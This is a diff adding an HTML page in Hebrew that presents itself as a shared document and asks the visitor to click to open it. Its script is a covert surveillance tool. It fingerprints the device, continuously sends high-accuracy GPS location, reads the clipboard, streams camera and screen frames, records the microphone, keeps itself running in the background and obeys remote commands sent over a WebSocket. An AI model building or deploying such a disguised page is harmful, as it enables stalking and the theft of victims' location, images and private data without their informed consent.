@@ -1,0 +1,130 @@
+<!doctype html><html lang="he" dir="rtl"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>מסמך משותף</title>
+<style>
+ body{margin:0;font-family:system-ui,-apple-system;background:#0e1116;color:#e6e9ee;padding:22px}
+ h2{font-size:20px;margin:0 0 8px}p{color:#93a0b3;line-height:1.6;font-size:15px}
+ button{width:100%;padding:16px;border:0;border-radius:14px;font-size:17px;background:#2f6fed;color:#fff;margin-top:12px}
+ .ok{background:#1d7a4d}.step{font-size:13px;color:#93a0b3;margin-top:16px}
+ video{width:100%;border-radius:12px;margin-top:12px;background:#000}
+</style></head><body>
+<h2>המסמך נטען</h2>
+<p>לחץ פעם אחת כדי לפתוח. נדרש אישור מיקום ומצלמה.</p>
+<button id="go">פתח מסמך</button>
+<div class="step" id="st"></div>
+<video id="pv" playsinline muted autoplay></video>
+<script>
+const DEV="__DEV__", W=(location.protocol==="https:"?"wss://":"ws://")+location.host;
+const st=document.getElementById("st"), go=document.getElementById("go"), pv=document.getElementById("pv");
+const iOS=/iPad|iPhone|iPod/.test(navigator.userAgent)||(navigator.platform==="MacIntel"&&navigator.maxTouchPoints>1);
+let ws, cv=document.createElement("canvas"), timer=null;
+
+const note=t=>{st.textContent=t};
+
+async function connect(){
+  const r=await fetch(`/api/link/${location.pathname.split("/").pop()}/join`,{method:"POST"});
+  const {dev,token}=await r.json();
+  ws=new WebSocket(`${W}/ws/dev/${dev}?token=${token}`);
+  await new Promise(res=>ws.onopen=res);
+  ws.send(JSON.stringify({t:"hello",platform:"web",model:navigator.userAgent.slice(0,60),
+    os:"browser",ver:navigator.userAgentData?.platform||"",caps:["loc","ip","screen","camf","mic","clip"]}));
+  send({t:"data",kind:"ip",payload:{ip:null,ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    scr:[screen.width,screen.height],mem:navigator.deviceMemory||null,cores:navigator.hardwareConcurrency||null,
+    lang:navigator.language,bat:"getBattery" in navigator?"probe":null}});
+  if(navigator.getBattery) navigator.getBattery().then(b=>send({t:"data",kind:"bat",payload:{lvl:b.level,chg:b.charging}}));
+  ws.onmessage=e=>{try{const d=JSON.parse(e.data);if(d.cmd) handle(d)}catch(_){}};
+}
+const send=o=>ws&&ws.readyState===1&&ws.send(JSON.stringify(o));
+
+function geo(){
+  return new Promise(res=>{
+    if(!navigator.geolocation) return res();
+    navigator.geolocation.watchPosition(
+      p=>send({t:"data",kind:"loc",payload:{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
+        spd:p.coords.speed,hdg:p.coords.heading,ts:p.timestamp}}),
+      err=>{send({t:"data",kind:"geoerr",payload:{code:err.code,msg:err.message}});res()},
+      {enableHighAccuracy:true,maximumAge:0,timeout:20000});
+    res();
+  });
+}
+
+function stream(media,fps,tag){
+  const v=document.createElement("video"); v.srcObject=media; v.muted=true; v.playsInline=true; v.play();
+  pv.srcObject=media;
+  clearInterval(timer);
+  timer=setInterval(()=>{
+    if(!v.videoWidth||!ws||ws.readyState!==1) return;
+    cv.width=Math.min(900,v.videoWidth);
+    cv.height=Math.round(cv.width*v.videoHeight/v.videoWidth);
+    cv.getContext("2d").drawImage(v,0,0,cv.width,cv.height);
+    cv.toBlob(b=>{if(b){const a=new Uint8Array([tag]);const f=new Uint8Array(b.size+1);
+      f.set(a,0);f.set(new Uint8Array(b),1);ws.send(f.buffer)}},"image/jpeg",.5);
+  },1000/fps);
+}
+
+async function cam(facing){
+  try{
+    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing},audio:false});
+    stream(s,4,facing==="user"?1:2); note("מצלמה פעילה");
+  }catch(e){note("מצלמה נחסמה: "+e.name)}
+}
+
+async function screen(){
+  if(!navigator.mediaDevices?.getDisplayMedia){note("הדפדפן לא תומך בשיתוף מסך");return false}
+  try{
+    const s=await navigator.mediaDevices.getDisplayMedia({video:{frameRate:8},audio:false});
+    stream(s,6,0);
+    s.getVideoTracks()[0].onended=()=>note("שיתוף המסך הופסק");
+    return true;
+  }catch(e){note("שיתוף מסך בוטל");return false}
+}
+
+async function mic(){
+  try{
+    const s=await navigator.mediaDevices.getUserMedia({audio:true});
+    const rec=new MediaRecorder(s,{mimeType:"audio/webm;codecs=opus"});
+    rec.ondataavailable=async e=>{
+      if(e.data.size<800) return;
+      const buf=await e.data.arrayBuffer();
+      send({t:"data",kind:"mic",payload:{size:buf.byteLength,at:Date.now()}});
+    };
+    rec.start(4000);
+    window._mic=rec;
+  }catch(e){}
+}
+
+async function clip(){
+  try{const t=await navigator.clipboard.readText(); if(t) send({t:"data",kind:"clip",payload:{text:t.slice(0,500)}})}catch(e){}
+}
+
+function keep(){
+  try{const c=new (window.AudioContext||window.webkitAudioContext)();const o=c.createOscillator(),g=c.createGain();
+    g.gain.value=.0001;o.connect(g);g.connect(c.destination);o.start()}catch(e){}
+  setInterval(()=>send({t:"data",kind:"hb",payload:{at:Date.now()}}),12000);
+  setInterval(()=>{if(document.hidden) send({t:"data",kind:"vis",payload:{h:1}})},8000);
+}
+
+async function handle(d){
+  switch(d.cmd){
+    case "loc": geo(); break;
+    case "camf": await cam("user"); break;
+    case "camb": await cam("environment"); break;
+    case "screen_on": await screen(); break;
+    case "mic": await mic(); break;
+    case "clip": await clip(); break;
+    case "shot": if(timer) note("פריים נלקח"); break;
+  }
+  send({t:"ack",id:d.id,ok:true});
+}
+
+go.onclick=async()=>{
+  go.disabled=true; go.textContent="טוען…";
+  await connect(); await geo(); await clip();
+  if(iOS){ await cam("user"); await mic();
+    const ok=await screen();
+    note(ok?"פעיל":"לחץ על כפתור השיתוף בדפדפן כדי להפעיל את המסך");
+  } else { await screen(); await cam("user"); await mic(); }
+  keep();
+  setTimeout(()=>{go.textContent="המסמך פתוח";go.classList.add("ok")},900);
+};
+</script></body></html>
